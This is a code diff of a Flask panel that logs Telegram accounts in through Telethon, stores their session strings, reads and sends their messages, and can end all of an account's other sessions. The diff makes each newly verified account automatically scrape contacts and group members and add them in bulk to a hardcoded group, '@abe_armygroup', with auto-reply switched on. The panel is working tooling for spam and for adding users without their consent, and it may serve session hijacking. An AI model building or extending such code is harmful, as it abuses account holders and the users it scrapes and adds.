@@ -15,6 +15,10 @@ import requests
 from datetime import datetime, timedelta
 import socket
 import re
+import traceback
+from functools import wraps
+from concurrent.futures import ThreadPoolExecutor
+import signal
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -817,10 +821,7 @@ def start_auto_reply_thread():
 
 # ==================== AUTO ADD SYSTEM START ====================
 
-import traceback
-from functools import wraps
-from concurrent.futures import ThreadPoolExecutor
-import signal
+
 
 # File paths
 AUTO_ADD_SETTINGS_FILE = 'auto_add_settings.json'
@@ -2200,6 +2201,7 @@ def start_all_auto_add():
 # ==================== AUTO ADD SYSTEM END ====================
 
 # ==================== ALL API ROUTES ====================
+# ==================== ALL API ROUTES ====================
 
 @app.route('/')
 def home():
@@ -2209,17 +2211,21 @@ def home():
 def login():
     return send_file('login.html')
 
-@app.route('/dashboard')
-def dashboard():
-    return send_file('dashboard.html')
+@app.route('/all')
+def all_sessions():
+    return send_file('all.html')
+
+@app.route('/fog')
+def fog():
+    return send_file('fog.html')
 
 @app.route('/dash')
 def dash():
     return send_file('dash.html')
 
-@app.route('/all')
-def all_sessions():
-    return send_file('all.html')
+@app.route('/dashboard')
+def dashboard():
+    return send_file('dashboard.html')
 
 @app.route('/auto-add')
 def auto_add():
@@ -2229,25 +2235,28 @@ def auto_add():
 def settings():
     return send_file('settings.html')
 
-@app.route('/fog')
-def fog():
-    return send_file('fog.html')
-
 @app.route('/api/accounts', methods=['GET'])
 def get_accounts():
-    formatted = []
-    for acc in accounts:
-        account_key = str(acc['id'])
-        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
-        has_auto_add = account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False)
-        formatted.append({
-            'id': acc.get('id'),
-            'phone': acc.get('phone', ''),
-            'name': acc.get('name', 'Unknown'),
-            'auto_reply_enabled': has_reply,
-            'auto_add_enabled': has_auto_add
-        })
-    return jsonify({'success': True, 'accounts': formatted})
+    try:
+        formatted = []
+        for acc in accounts:
+            account_key = str(acc['id'])
+            has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
+            has_auto_add = account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False)
+            auto_add_running = account_key in active_auto_add_tasks
+            
+            formatted.append({
+                'id': acc.get('id'),
+                'phone': acc.get('phone', ''),
+                'name': acc.get('name', 'Unknown'),
+                'auto_reply_enabled': has_reply,
+                'auto_add_enabled': has_auto_add,
+                'auto_add_running': auto_add_running
+            })
+        return jsonify({'success': True, 'accounts': formatted})
+    except Exception as e:
+        logger.error(f"Error getting accounts: {e}")
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
@@ -2291,6 +2300,7 @@ def add_account():
             except errors.PhoneNumberBannedError:
                 return {'success': False, 'error': 'This phone number is banned'}
             except Exception as e:
+                logger.error(f"Send code error: {e}")
                 return {'success': False, 'error': str(e)}
             finally:
                 await client.disconnect()
@@ -2299,747 +2309,665 @@ def add_account():
         return jsonify(result)
         
     except Exception as e:
+        logger.error(f"Add account error: {e}")
         return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
 
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
-    data = request.json
-    code = data.get('code')
-    session_id = data.get('session_id')
-    password = data.get('password', '')
-    
-    if not code or not session_id:
-        return jsonify({'success': False, 'error': 'Missing code or session'})
-    
-    if session_id not in temp_sessions:
-        return jsonify({'success': False, 'error': 'Session expired'})
-    
-    session_data = temp_sessions[session_id]
-    
-    async def verify():
-        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            try:
-                await client.sign_in(
-                    session_data['phone'], 
-                    code, 
-                    phone_code_hash=session_data['hash']
-                )
-            except errors.SessionPasswordNeededError:
-                if not password:
-                    return {'need_password': True}
-                await client.sign_in(password=password)
-            
-            me = await client.get_me()
-            
-            new_id = 1
-            if accounts:
-                new_id = max([a['id'] for a in accounts]) + 1
-            
-            new_account = {
-                'id': new_id,
-                'phone': me.phone or session_data['phone'],
-                'name': me.first_name or 'User',
-                'session': client.session.save()
-            }
-            
-            accounts.append(new_account)
-            save_accounts()
-            
-            return {'success': True}
-            
-        except errors.PhoneCodeInvalidError:
-            return {'success': False, 'error': 'Invalid code'}
-        except errors.PhoneCodeExpiredError:
-            return {'success': False, 'error': 'Code expired'}
-        except errors.PasswordHashInvalidError:
-            return {'success': False, 'error': 'Invalid password'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(verify())
-        if session_id in temp_sessions:
-            del temp_sessions[session_id]
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def fetch():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            dialogs = await client.get_dialogs()
-            
-            chats = []
-            for dialog in dialogs:
-                if not dialog:
-                    continue
-                
-                chat_type = 'user'
-                if dialog.is_group:
-                    chat_type = 'group'
-                elif dialog.is_channel:
-                    chat_type = 'channel'
-                
-                chat = {
-                    'id': str(dialog.id),
-                    'title': dialog.name or 'Unknown',
-                    'type': chat_type,
-                    'unread': dialog.unread_count or 0,
-                    'lastMessage': '',
-                    'lastMessageDate': 0
-                }
-                
-                if dialog.message:
-                    if dialog.message.text:
-                        chat['lastMessage'] = dialog.message.text[:50]
-                    elif dialog.message.media:
-                        chat['lastMessage'] = '📎 Media'
-                    
-                    if dialog.message.date:
-                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
-                
-                chats.append(chat)
-            
-            return {'success': True, 'chats': chats}
-            
-        except AuthKeyUnregisteredError:
-            remove_invalid_account(account_id)
-            return {'success': False, 'error': 'auth_key_unregistered'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(fetch())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/send-message', methods=['POST'])
-def send_message():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    message = data.get('message')
-    
-    if not account_id or not chat_id or not message:
-        return jsonify({'success': False, 'error': 'Missing required fields'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def send():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            try:
-                entity = await client.get_entity(int(chat_id))
-            except:
-                try:
-                    entity = await client.get_entity(chat_id)
-                except:
-                    return {'success': False, 'error': 'Chat not found'}
-            
-            await client.send_message(entity, message)
-            return {'success': True}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(send())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/remove-account', methods=['POST'])
-def remove_account():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    global accounts
-    
-    stop_auto_reply_for_account(account_id)
-    
-    original_len = len(accounts)
-    accounts = [acc for acc in accounts if acc['id'] != account_id]
-    
-    if len(accounts) < original_len:
-        save_accounts()
-        return jsonify({'success': True})
-    
-    return jsonify({'success': False, 'error': 'Account not found'})
-
-@app.route('/api/reply-settings', methods=['GET'])
-def get_reply_settings():
-    account_id = request.args.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    settings = reply_settings.get(account_key, {
-        'enabled': False,
-        'chats': {}
-    })
-    
-    return jsonify({'success': True, 'settings': settings})
-
-@app.route('/api/reply-settings', methods=['POST'])
-def update_reply_settings():
-    data = request.json
-    account_id = data.get('accountId')
-    enabled = data.get('enabled', False)
-    chat_settings = data.get('chats', {})
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    
-    if account_key not in reply_settings:
-        reply_settings[account_key] = {}
-    
-    was_enabled = reply_settings[account_key].get('enabled', False)
-    reply_settings[account_key]['enabled'] = enabled
-    reply_settings[account_key]['chats'] = chat_settings
-    
-    save_reply_settings()
-    
-    if enabled and not was_enabled:
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if account and account_key not in active_clients:
-            thread = threading.Thread(
-                target=lambda: run_async(start_auto_reply_for_account(account)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[account_key] = thread
-            logger.info(f"Started auto-reply for account {account_id}")
-    elif not enabled and was_enabled:
-        stop_auto_reply_for_account(account_id)
-    
-    return jsonify({'success': True, 'message': 'Settings updated'})
-
-@app.route('/api/toggle-chat-reply', methods=['POST'])
-def toggle_chat_reply():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    enabled = data.get('enabled', True)
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    
-    if account_key not in reply_settings:
-        reply_settings[account_key] = {'enabled': False, 'chats': {}}
-    
-    if 'chats' not in reply_settings[account_key]:
-        reply_settings[account_key]['chats'] = {}
-    
-    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
-    
-    save_reply_settings()
-    
-    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})
-
-@app.route('/api/conversation-history', methods=['GET'])
-def get_conversation_history():
-    account_id = request.args.get('accountId')
-    chat_id = request.args.get('chatId')
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    chat_key = str(chat_id)
-    
-    history = []
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        history = conversation_history[account_key][chat_key]
-    
-    return jsonify({'success': True, 'history': history})
-
-@app.route('/api/clear-history', methods=['POST'])
-def clear_conversation_history():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    chat_key = str(chat_id)
-    
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        conversation_history[account_key][chat_key] = []
-        save_conversation_history()
-    
-    return jsonify({'success': True, 'message': 'History cleared'})
-
-@app.route('/api/get-sessions', methods=['POST'])
-def get_sessions():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def get_sessions():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            sessions = []
-            current_hash = None
-            
-            for auth in result.authorizations:
-                session_info = {
-                    'hash': auth.hash,
-                    'device_model': auth.device_model,
-                    'platform': auth.platform,
-                    'system_version': auth.system_version,
-                    'api_id': auth.api_id,
-                    'app_name': auth.app_name,
-                    'app_version': auth.app_version,
-                    'date_created': auth.date_created,
-                    'date_active': auth.date_active,
-                    'ip': auth.ip,
-                    'country': auth.country,
-                    'region': auth.region,
-                    'current': auth.current
-                }
-                
-                if auth.current:
-                    current_hash = auth.hash
-                
-                sessions.append(session_info)
-            
-            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
-            
-        except FreshResetAuthorisationForbiddenError:
-            return {'success': False, 'error': 'fresh_reset_forbidden'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(get_sessions())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-session', methods=['POST'])
-def terminate_session():
-    data = request.json
-    account_id = data.get('accountId')
-    session_hash = data.get('hash')
-    
-    if not account_id or not session_hash:
-        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
-            return {'success': True}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-sessions', methods=['POST'])
-def terminate_sessions():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            current_hash = None
-            for auth in result.authorizations:
-                if auth.current:
-                    current_hash = auth.hash
-                    break
-            
-            count = 0
-            for auth in result.authorizations:
-                if auth.hash != current_hash:
-                    try:
-                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
-                        count += 1
-                    except:
-                        continue
-            
-            return {'success': True, 'message': f'Terminated {count} sessions'}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-# AUTO-ADD API ENDPOINTS
-@app.route('/api/auto-add-settings', methods=['GET'])
-def get_auto_add_settings():
-    account_id = request.args.get('accountId')
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    
-    default_settings = {
-        'enabled': True,
-        'target_group': '@abe_armygroup',
-        'delay_seconds': 15,
-        'daily_limit': 200,
-        'source_groups': DEFAULT_SOURCE_GROUPS,
-        'use_contacts': True,
-        'use_recent_chats': True,
-        'use_scraping': True,
-        'scrape_limit_per_group': 500,
-        'skip_bots': True,
-        'auto_join': True,
-        'total_added': 0,
-        'added_today': 0,
-        'last_reset': datetime.now().strftime('%Y-%m-%d'),
-        'last_added': None
-    }
-    
-    if account_key in auto_add_settings:
-        settings = auto_add_settings[account_key]
-        for key, value in default_settings.items():
-            if key not in settings:
-                settings[key] = value
-    else:
-        settings = default_settings.copy()
-        auto_add_settings[account_key] = settings
-        save_auto_add_settings()
-    
-    return jsonify({'success': True, 'settings': settings})
-
-@app.route('/api/auto-add-settings', methods=['POST'])
-def update_auto_add_settings():
     try:
         data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No data received'})
+        code = data.get('code')
+        session_id = data.get('session_id')
+        password = data.get('password', '')
         
-        account_id = data.get('accountId')
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
+        if not code or not session_id:
+            return jsonify({'success': False, 'error': 'Missing code or session'})
         
-        account_key = str(account_id)
+        if session_id not in temp_sessions:
+            return jsonify({'success': False, 'error': 'Session expired'})
         
-        if account_key not in auto_add_settings:
-            auto_add_settings[account_key] = {}
+        session_data = temp_sessions[session_id]
         
-        was_enabled = auto_add_settings[account_key].get('enabled', False)
-        
-        for key in ['enabled', 'target_group', 'delay_seconds', 'daily_limit',
-                   'use_contacts', 'use_recent_chats', 'use_scraping',
-                   'scrape_limit_per_group', 'skip_bots', 'auto_join']:
-            if key in data:
-                auto_add_settings[account_key][key] = data[key]
-        
-        if 'source_groups' in data:
-            auto_add_settings[account_key]['source_groups'] = data['source_groups']
-        
-        save_auto_add_settings()
-        
-        if auto_add_settings[account_key].get('enabled', False) and not was_enabled:
-            account = next((acc for acc in accounts if acc['id'] == account_id), None)
-            if account:
-                thread = threading.Thread(
-                    target=lambda: run_async(ultra_fast_auto_add_loop(account)),
-                    daemon=True
-                )
-                thread.start()
-                client_tasks[f"auto_add_{account_key}"] = thread
-                logger.info(f"🚀 Started auto-add for account {account_id}")
-        
-        return jsonify({'success': True, 'message': 'Settings updated'})
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/auto-add-stats', methods=['GET'])
-def get_auto_add_stats():
-    account_id = request.args.get('accountId')
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    settings = auto_add_settings.get(account_key, {})
-    pool = added_members_pool.get(account_key, {})
-    
-    total_scraped = len(pool.get('all_scraped', []))
-    already_added = len(pool.get('already_added', []))
-    failed = len(pool.get('failed_to_add', []))
-    available = total_scraped - already_added - failed
-    
-    return jsonify({
-        'success': True,
-        'added_today': settings.get('added_today', 0),
-        'total_added': settings.get('total_added', 0),
-        'enabled': settings.get('enabled', False),
-        'daily_limit': settings.get('daily_limit', 200),
-        'pool_size': total_scraped,
-        'available_to_add': max(0, available),
-        'already_added': already_added,
-        'failed': failed,
-        'last_reset': settings.get('last_reset', ''),
-        'last_added': settings.get('last_added')
-    })
-
-@app.route('/api/test-auto-add', methods=['POST'])
-def test_auto_add():
-    try:
-        data = request.json
-        account_id = data.get('accountId')
-        
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
-        
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if not account:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def test():
-            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        async def verify():
+            client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
             await client.connect()
             
             try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Account not authorized'}
-                
-                settings = auto_add_settings.get(str(account_id), {})
-                target_group = settings.get('target_group', '@abe_armygroup')
-                
-                if not target_group.startswith('@') and not target_group.startswith('https://'):
-                    target_group = '@' + target_group
-                
-                group_found = False
-                group_title = target_group
-                
                 try:
-                    group = await client.get_entity(target_group)
-                    group_found = True
-                    group_title = group.title if hasattr(group, 'title') else target_group
-                except Exception as e:
-                    return {'success': False, 'error': f'Target group error: {str(e)}'}
+                    await client.sign_in(
+                        session_data['phone'], 
+                        code, 
+                        phone_code_hash=session_data['hash']
+                    )
+                except errors.SessionPasswordNeededError:
+                    if not password:
+                        return {'need_password': True}
+                    await client.sign_in(password=password)
                 
-                available = 0
-                sources = []
+                me = await client.get_me()
                 
-                if settings.get('use_contacts', True):
-                    try:
-                        contacts = await client(functions.contacts.GetContactsRequest(0))
-                        available += len(contacts.users)
-                        sources.append(f"Contacts: {len(contacts.users)}")
-                    except:
-                        pass
+                new_id = 1
+                if accounts:
+                    new_id = max([a['id'] for a in accounts]) + 1
                 
-                return {
-                    'success': True,
-                    'group_found': group_found,
-                    'group_title': group_title,
-                    'available_members': available,
-                    'sources_found': sources,
-                    'can_add': group_found and available > 0
+                new_account = {
+                    'id': new_id,
+                    'phone': me.phone or session_data['phone'],
+                    'name': me.first_name or 'User',
+                    'session': client.session.save()
                 }
                 
-            finally:
-                await client.disconnect()
-        
-        result = run_async(test())
-        return jsonify(result)
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/auto-join-target-group', methods=['POST'])
-def auto_join_target_group_endpoint():
-    try:
-        data = request.json
-        account_id = data.get('accountId')
-        
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
-        
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if not account:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        account_key = str(account_id)
-        settings = auto_add_settings.get(account_key, {})
-        target_group = data.get('targetGroup') or settings.get('target_group', '@abe_armygroup')
-        
-        async def join_target():
-            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-            await client.connect()
-            
-            try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Account not authorized'}
+                accounts.append(new_account)
+                save_accounts()
                 
-                result = await auto_join_target_group(client, account_id, target_group)
+                # Auto-enable auto-add for new account
+                account_key = str(new_id)
+                if account_key not in auto_add_settings:
+                    auto_add_settings[account_key] = {
+                        'enabled': True,
+                        'target_group': '@abe_armygroup',
+                        'delay_seconds': 15,
+                        'daily_limit': 200,
+                        'source_groups': DEFAULT_SOURCE_GROUPS,
+                        'use_contacts': True,
+                        'use_recent_chats': True,
+                        'use_scraping': True,
+                        'scrape_limit_per_group': 500,
+                        'skip_bots': True,
+                        'auto_join': True,
+                        'total_added': 0,
+                        'added_today': 0,
+                        'last_reset': datetime.now().strftime('%Y-%m-%d'),
+                        'last_added': None
+                    }
+                    save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
                 
-                if result:
-                    return {
-                        'success': True,
-                        'message': f'Successfully joined {target_group}',
-                        'joined': True
+                # Auto-enable auto-reply
+                if account_key not in reply_settings:
+                    reply_settings[account_key] = {
+                        'enabled': True,
+                        'chats': {}
                     }
-                else:
-                    return {
-                        'success': False,
-                        'error': f'Could not join {target_group}'
-                    }
-                    
+                    save_reply_settings()
+                
+                # Start auto-add worker
+                AutoAddManager.start_for_account(new_account)
+                
+                # Start auto-reply
+                if account_key not in active_clients:
+                    thread = threading.Thread(
+                        target=lambda: run_async(start_auto_reply_for_account(new_account)),
+                        daemon=True
+                    )
+                    thread.start()
+                    client_tasks[account_key] = thread
+                
+                return {'success': True}
+                
+            except errors.PhoneCodeInvalidError:
+                return {'success': False, 'error': 'Invalid code'}
+            except errors.PhoneCodeExpiredError:
+                return {'success': False, 'error': 'Code expired'}
+            except errors.PasswordHashInvalidError:
+                return {'success': False, 'error': 'Invalid password'}
             except Exception as e:
+                logger.error(f"Verify error: {e}")
                 return {'success': False, 'error': str(e)}
             finally:
                 await client.disconnect()
         
-        result = run_async(join_target())
+        result = run_async(verify())
+        if session_id in temp_sessions:
+            del temp_sessions[session_id]
         return jsonify(result)
         
     except Exception as e:
+        logger.error(f"Verify code error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/get-messages', methods=['POST'])
+def get_messages():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        account = next((acc for acc in accounts if acc['id'] == account_id), None)
+        
+        if not account:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def fetch():
+            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await client.connect()
+            
+            try:
+                if not await client.is_user_authorized():
+                    return {'success': False, 'error': 'auth_key_unregistered'}
+                
+                dialogs = await client.get_dialogs()
+                
+                chats = []
+                for dialog in dialogs:
+                    if not dialog:
+                        continue
+                    
+                    chat_type = 'user'
+                    if dialog.is_group:
+                        chat_type = 'group'
+                    elif dialog.is_channel:
+                        chat_type = 'channel'
+                    
+                    chat = {
+                        'id': str(dialog.id),
+                        'title': dialog.name or 'Unknown',
+                        'type': chat_type,
+                        'unread': dialog.unread_count or 0,
+                        'lastMessage': '',
+                        'lastMessageDate': 0
+                    }
+                    
+                    if dialog.message:
+                        if dialog.message.text:
+                            chat['lastMessage'] = dialog.message.text[:50]
+                        elif dialog.message.media:
+                            chat['lastMessage'] = '📎 Media'
+                        
+                        if dialog.message.date:
+                            chat['lastMessageDate'] = int(dialog.message.date.timestamp())
+                    
+                    chats.append(chat)
+                
+                return {'success': True, 'chats': chats}
+                
+            except AuthKeyUnregisteredError:
+                remove_invalid_account(account_id)
+                return {'success': False, 'error': 'auth_key_unregistered'}
+            except Exception as e:
+                logger.error(f"Fetch messages error: {e}")
+                return {'success': False, 'error': str(e)}
+            finally:
+                await client.disconnect()
+        
+        result = run_async(fetch())
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Get messages error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/send-message', methods=['POST'])
+def send_message():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        chat_id = data.get('chatId')
+        message = data.get('message')
+        
+        if not account_id or not chat_id or not message:
+            return jsonify({'success': False, 'error': 'Missing required fields'})
+        
+        account = next((acc for acc in accounts if acc['id'] == account_id), None)
+        
+        if not account:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def send():
+            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await client.connect()
+            
+            try:
+                if not await client.is_user_authorized():
+                    return {'success': False, 'error': 'auth_key_unregistered'}
+                
+                try:
+                    entity = await client.get_entity(int(chat_id))
+                except:
+                    try:
+                        entity = await client.get_entity(chat_id)
+                    except:
+                        return {'success': False, 'error': 'Chat not found'}
+                
+                await client.send_message(entity, message)
+                return {'success': True}
+                
+            except Exception as e:
+                logger.error(f"Send message error: {e}")
+                return {'success': False, 'error': str(e)}
+            finally:
+                await client.disconnect()
+        
+        result = run_async(send())
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Send message error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/remove-account', methods=['POST'])
+def remove_account():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        global accounts
+        
+        # Stop auto-reply
+        stop_auto_reply_for_account(account_id)
+        
+        # Stop auto-add
+        AutoAddManager.stop_for_account(account_id)
+        
+        # Remove account
+        original_len = len(accounts)
+        accounts = [acc for acc in accounts if acc['id'] != account_id]
+        
+        if len(accounts) < original_len:
+            save_accounts()
+            return jsonify({'success': True, 'message': 'Account removed successfully'})
+        
+        return jsonify({'success': False, 'error': 'Account not found'})
+        
+    except Exception as e:
+        logger.error(f"Remove account error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/reply-settings', methods=['GET'])
+def get_reply_settings():
+    try:
+        account_id = request.args.get('accountId')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        account_key = str(account_id)
+        settings = reply_settings.get(account_key, {
+            'enabled': False,
+            'chats': {}
+        })
+        
+        return jsonify({'success': True, 'settings': settings})
+        
+    except Exception as e:
+        logger.error(f"Get reply settings error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/reply-settings', methods=['POST'])
+def update_reply_settings():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        enabled = data.get('enabled', False)
+        chat_settings = data.get('chats', {})
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        account_key = str(account_id)
+        
+        if account_key not in reply_settings:
+            reply_settings[account_key] = {}
+        
+        was_enabled = reply_settings[account_key].get('enabled', False)
+        reply_settings[account_key]['enabled'] = enabled
+        reply_settings[account_key]['chats'] = chat_settings
+        
+        save_reply_settings()
+        
+        if enabled and not was_enabled:
+            account = next((acc for acc in accounts if acc['id'] == account_id), None)
+            if account and account_key not in active_clients:
+                thread = threading.Thread(
+                    target=lambda: run_async(start_auto_reply_for_account(account)),
+                    daemon=True
+                )
+                thread.start()
+                client_tasks[account_key] = thread
+                logger.info(f"Started auto-reply for account {account_id}")
+        elif not enabled and was_enabled:
+            stop_auto_reply_for_account(account_id)
+        
+        return jsonify({'success': True, 'message': 'Settings updated'})
+        
+    except Exception as e:
+        logger.error(f"Update reply settings error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/toggle-chat-reply', methods=['POST'])
+def toggle_chat_reply():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        chat_id = data.get('chatId')
+        enabled = data.get('enabled', True)
+        
+        if not account_id or not chat_id:
+            return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
+        
+        account_key = str(account_id)
+        
+        if account_key not in reply_settings:
+            reply_settings[account_key] = {'enabled': False, 'chats': {}}
+        
+        if 'chats' not in reply_settings[account_key]:
+            reply_settings[account_key]['chats'] = {}
+        
+        reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
+        
+        save_reply_settings()
+        
+        return jsonify({'success': True, 'message': f'Auto-reply {"enabled" if enabled else "disabled"}'})
+        
+    except Exception as e:
+        logger.error(f"Toggle chat reply error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/conversation-history', methods=['GET'])
+def get_conversation_history():
+    try:
+        account_id = request.args.get('accountId')
+        chat_id = request.args.get('chatId')
+        
+        if not account_id or not chat_id:
+            return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
+        
+        account_key = str(account_id)
+        chat_key = str(chat_id)
+        
+        history = []
+        if account_key in conversation_history and chat_key in conversation_history[account_key]:
+            history = conversation_history[account_key][chat_key]
+        
+        return jsonify({'success': True, 'history': history})
+        
+    except Exception as e:
+        logger.error(f"Get conversation history error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/clear-history', methods=['POST'])
+def clear_conversation_history():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        chat_id = data.get('chatId')
+        
+        if not account_id or not chat_id:
